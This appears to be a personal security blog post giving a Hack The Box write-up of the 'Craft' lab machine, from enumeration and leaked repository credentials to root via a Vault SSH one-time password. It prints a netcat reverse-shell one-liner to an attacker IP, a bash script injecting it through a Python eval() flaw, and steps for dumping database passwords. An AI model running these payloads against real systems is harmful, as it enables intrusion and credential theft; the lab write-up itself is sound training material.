<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Hack The Box: Craft write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="Hack The Box: Craft write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="One of the best machines I’ve come across: from an API with vulnerabilities to a docker container that has a database with credentials exposed! What can be more realistic?" /><meta property="og:description" content="One of the best machines I’ve come across: from an API with vulnerabilities to a docker container that has a database with credentials exposed! What can be more realistic?" /><link rel="canonical" href="http://localhost:4000/posts/Craft/" /><meta property="og:url" content="http://localhost:4000/posts/Craft/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-07-26T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box: Craft write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Hack The Box: Craft write-up","dateModified":"2019-07-26T00:00:00+02:00","datePublished":"2019-07-26T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Craft/"},"url":"http://localhost:4000/posts/Craft/","author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"One of the best machines I’ve come across: from an API with vulnerabilities to a docker container that has a database with credentials exposed! What can be more realistic?","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box: Craft write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box: Craft write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Fri, Jul 26, 2019, 12:00 AM +0200"> Jul 26, 2019 <i class="unloaded">2019-07-26T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 28, 2020, 12:38 AM +0300"> May 28, 2020 <i class="unloaded">2020-05-27T23:38:30+02:00</i> </span></div></div><div class="post-content"> <img src="/assets/posts_details/Craft/images/header.png"><h1 id="hack-the-box-craft-machine-write-up">Hack The Box: Craft machine write-up</h1><p>Craft is a medium-rated machine which I found really realistic in the sense that we enumerate an initial webpage to find two domains, one has a gogs instance (<a href="https://gogs.io/">gogs</a> is, according to their website, a “painless self-hosted git service”) while the other is a API in development. From there we can exploit some flaws to get to a docker instance which contains a database with some credentials that can be used to get into the machine through SSH. Then, we find an uncommon file and come up against a “vault” service, which stores passwords, credentials, certificates (all the juicy stuff). From there we can SSH using that service as root using a one time password (OTP).</p><p>Besides, it’s also based on Sillicon Valley, which makes it way more cooler!</p><p>Let’s dig in! The IP of the machine is <code class="highlighter-rouge">10.10.10.110</code> and, as always, I included it in my <code class="highlighter-rouge">/etc/hosts</code> file as <code class="highlighter-rouge">craft.htb</code>.</p><h3 id="enumeration">Enumeration</h3><p>I start by enumerating open ports to discover the services running in the machine. I fire up nmap:</p><p><em>Result of nmap scan</em></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.70 scan initiated Tue Jul 16 18:55:29 2019 as: nmap -sV -sC -oN nmap/initial craft.htb</span>
Nmap scan report <span class="k">for </span>10.10.10.110
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 <span class="o">(</span>ED25519<span class="o">)</span>
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>craft.htb/organizationName<span class="o">=</span>Craft/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Jul 16 18:55:52 2019 -- 1 IP address (1 host up) scanned in 22.45 seconds</span>
</pre></table></code></div></div><p>Okay so not too much, just SSH and a web server over HTTPS. We’ll look at the second one for now.</p><h4 id="port-443-enumeration">Port 443 enumeration</h4><p>Upon visiting the webpage I find that there is an API in development and by checking the two links on the top right corner I get two domains: <code class="highlighter-rouge">gogs.craft.htb</code> and <code class="highlighter-rouge">api.craft.htb</code>.</p><p><em>Webpage found on port 443</em></p><p><img src="/assets/posts_details/Craft/images/webpage.png" alt="Img" /></p><p><em>Domains found</em></p><p><img src="/assets/posts_details/Craft/images/domains.png" alt="Img" /></p><p>My <code class="highlighter-rouge">/etc/hosts</code> file has therefore these lines among others:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>10.10.10.110    craft.htb
10.10.10.110    gogs.craft.htb
10.10.10.110    api.craft.htb
</pre></table></code></div></div><h4 id="enumerating-apicrafthtb">Enumerating <code class="highlighter-rouge">api.craft.htb</code></h4><p>We can see that the box is using Swagger UI, which is a tool to visualize and interact with the API’s barebones.</p><p><em>API details with Swagger UI</em></p><p><img src="/assets/posts_details/Craft/images/swagger.png" alt="Img" /></p><p>I played a bit with it to come up with the following:</p><ul><li>There is authentication in place carried out under the endpoint <code class="highlighter-rouge">/auth</code>. But we don’t have credentials.</li><li>The actions related to beer in the <code class="highlighter-rouge">/brew</code> endpoint perform operations on a database, so there may be extra information in there.</li></ul><p>I decided to move on to <code class="highlighter-rouge">gogs.craft.htb</code>, as there wasn’t anything too interesting, I just learned the main functionality of the API.</p><h4 id="enumerating-gogscrafthtb">Enumerating <code class="highlighter-rouge">gogs.craft.htb</code></h4><p><em>Main page of gogs</em></p><p><img src="/assets/posts_details/Craft/images/gogs1.png" alt="Img" /></p><p>I went to the explore tab to find that there was one repository that contained the source code of the API:</p><p><em>Explore tab</em></p><p><img src="/assets/posts_details/Craft/images/gogs2.png" alt="Img" /></p><p><em>API repository</em></p><p><img src="/assets/posts_details/Craft/images/gogs3.png" alt="Img" /></p><p>I noticed that there were 6 commits and 2 issues (one already solved) on the repo, so I started going through them before actually checking the code. Another important detail was that there are three users: denish, erlich and gilfoyle.</p><p>I found some credentials for <code class="highlighter-rouge">dinesh</code> on one of the commits:</p><p><em>Found credentials on a commit</em></p><p><img src="/assets/posts_details/Craft/images/gogs4.png" alt="Img" /></p><p>There was as well a fix for an issue with the ABV validation. Well, a fix. It used Python’s <code class="highlighter-rouge">eval()</code> function, which is dangerous.</p><p><em>Vulnerable piece of code</em></p><p><img src="/assets/posts_details/Craft/images/gogs5.png" alt="Img" /></p><p>Then, inspecting the code I noticed that there were some credentials and secrets for the database connection inside <code class="highlighter-rouge">settings.py</code>. However, that file wasn’t on the repository as confirmed by the content of <code class="highlighter-rouge">.gitignore</code>.</p><p><em>Importing data from <code class="highlighter-rouge">settings.py</code> for the db connection</em></p><p><img src="/assets/posts_details/Craft/images/gogs6.png" alt="Img" /></p><h4 id="exploiting-the-api">Exploiting the API</h4><p>As the vulnerable code which executed eval needed authentication I came up with the following strategy:</p><ol><li>With the credentials found before <code class="highlighter-rouge">dinesh:4aUh0A8PbVJxgd</code>, authenticate on <code class="highlighter-rouge">/auth/login</code> and get a token.</li><li>Call the function that executes the vulnerable eval function under <code class="highlighter-rouge">/api/brew</code>.</li><li>Use that eval function to get a reverse shell.</li></ol><p>I had trouble getting a shell that worked but I finally found this one:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.56 8080 <span class="o">&gt;</span>/tmp/f
</pre></table></code></div></div><p>To automate all the boring process I wrote a quick bash script to do everything for me, I just needed to run the script and set up a netcat listener to get the connection:</p><p><em>Getting a reverse shell</em></p><p><img src="/assets/posts_details/Craft/images/reverse.png" alt="Img" /></p><p>Here is the bash script I wrote (I’m sure the token extraction part can be improved):</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">untrimmed</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-k</span> <span class="nt">-s</span> <span class="nt">-u</span> dinesh:4aUh0A8PbVJxgd <span class="nt">-X</span> GET <span class="s2">"https://api.craft.htb/api/auth/login"</span> <span class="nt">-H</span>  <span class="s2">"accept: application/json"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f2</span><span class="si">)</span>
<span class="nv">token</span><span class="o">=</span><span class="k">${</span><span class="nv">untrimmed</span>:1:-2<span class="k">}</span>

curl <span class="nt">-k</span> <span class="nt">-H</span> <span class="s2">"X-Craft-API-Token:</span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-X</span> POST <span class="s2">"https://api.craft.htb/api/brew/"</span> <span class="nt">--data</span> <span class="s1">'{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.13.39 8080 &gt;/tmp/f\")"}'</span> <span class="nt">-H</span> <span class="s2">"Content-Type:application/json"</span>
</pre></table></code></div></div><h4 id="getting-out-of-docker">Getting out of docker</h4><p>I thought I was inside the system but there was something weird going on: there was no user under <code class="highlighter-rouge">/home</code>, I was root and there was a <code class="highlighter-rouge">.dockerenv</code> file on <code class="highlighter-rouge">/</code>. I was inside a docker container!</p><p>First things first, I remembered that the API had that <code class="highlighter-rouge">settings.py</code> file which wasn’t on the gogs repo but should be on the container. So I navigated to <code class="highlighter-rouge">/opt/app/craft_api/</code> and was able to read it:</p><p><em>Contents of <code class="highlighter-rouge">settings.py</code></em></p><p><img src="/assets/posts_details/Craft/images/settings.png" alt="Img" /></p><p>I tried to use the credentials to log in as the users through SSH and also in gogs but no luck. Then, the database came to my mind.</p><p>There was a <code class="highlighter-rouge">dbtest.py</code> file under <code class="highlighter-rouge">/opt/app</code> so after modifying it the database could be queried!</p><p>The changes made were:</p><ul><li>A loop was added so that the enumeration was easier (like a command line)</li><li>A line was changed from</li></ul><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
</pre></table></code></div></div><p>to</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
</pre></table></code></div></div><p>This was because the first method only gets the first row returned from the query whereas the last one returns all of them, which is what we need.</p><p>Then, the script turned out to be like this:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
	<span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
			<span class="n">sql</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"SQL &gt; "</span><span class="p">)</span>
			<span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
			<span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
			<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>With the script I found a table called <code class="highlighter-rouge">users</code> which returned the passwords of all the users on the system!</p><p><em>Extracting information from the database</em></p><p><img src="/assets/posts_details/Craft/images/sql.png" alt="Img" /></p><p>With those credentials I thought I would be able to log in as one user using SSH and that would be the user but it turned out I was wrong. After trying all combinations I remembered the gogs service, maybe there was something else on one of the other accounts.</p><p>I managed to log in as <code class="highlighter-rouge">gilfoyle</code> and success! There was a private repo which contained SSH private keys!</p><p><em>Finding the private repo and getting the SSH keys</em></p><p><img src="/assets/posts_details/Craft/images/private1.png" alt="Img" /></p><p><img src="/assets/posts_details/Craft/images/private2.png" alt="Img" /></p><p><img src="/assets/posts_details/Craft/images/private3.png" alt="Img" /></p><p>Now I could log in as <code class="highlighter-rouge">gilfoyle</code> to the box using the key. But wait, I still got asked for a password! I googled it and found that it was common practice to use SSH keys alongside passphrases. Well, I already had the pass from the database, so I tried it and was in!</p><p><em>Getting user</em></p><p><img src="/assets/posts_details/Craft/images/user.png" alt="Img" /></p><h4 id="privilege-escalation">Privilege escalation</h4><p>After reading the flag I noticed a weird file on <code class="highlighter-rouge">gilfoyle</code>’s directory: <code class="highlighter-rouge">.vault-token</code>. A google search revealed that it was part of <code class="highlighter-rouge">vault</code>, which is a <a href="https://www.vaultproject.io/">service</a> that stores data safely as secrets on a machine. The privilege escalation had to be based on it!</p><p><em>Weird file on home dir</em></p><p><img src="/assets/posts_details/Craft/images/token.png" alt="Img" /></p><p>I started poking at the documentation and things and eventually found that tokens can be dynamically generated for user authentication into a system. I found that there was an option to log in as a user via one time password (OTP): https://learn.hashicorp.com/vault/secrets-management/sm-ssh-otp</p><p>I listed the roles with <code class="highlighter-rouge">vault list ssh/roles</code> and obtained one result: <code class="highlighter-rouge">root_otp</code>. Good, OTP with root!</p><p>I tried with <code class="highlighter-rouge">vault ssh root@localhost</code> and, as it was my first attempt I didn’t even need to specify the role and mode, I just copied the OTP and was in!</p><p><em>Getting root</em></p><p><img src="/assets/posts_details/Craft/images/root1.png" alt="Img" /></p><p><img src="/assets/posts_details/Craft/images/root2.png" alt="Img" /></p><p>I hope you enjoyed the machine! It was really fun, kudos to the author. If you liked the writeup you can give me respect on Hack The Box through the following link: <a href="https://www.Hack The Box.eu/home/users/profile/31531">https://www.Hack The Box.eu/home/users/profile/31531</a>.</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >SSH</a> <a href="/tags/python/" class="post-tag no-text-decoration" >Python</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >SQL</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >Docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box: Craft write-up - GoDiego&url=http://localhost:4000/posts/Craft/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box: Craft write-up - GoDiego&u=http://localhost:4000/posts/Craft/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box: Craft write-up - GoDiego&url=http://localhost:4000/posts/Craft/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/posts/Craft/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Intrigriti-XSS-Easter/">Intigriti Easter XSS challenge solution</a></li><li><a href="/posts/RITSEC-CTF/">RITSEC CTF: CictroHash write-up</a></li><li><a href="/posts/XMAS_CTF-nologin/">X-MAS CTF: Santa's No Password Login System</a></li><li><a 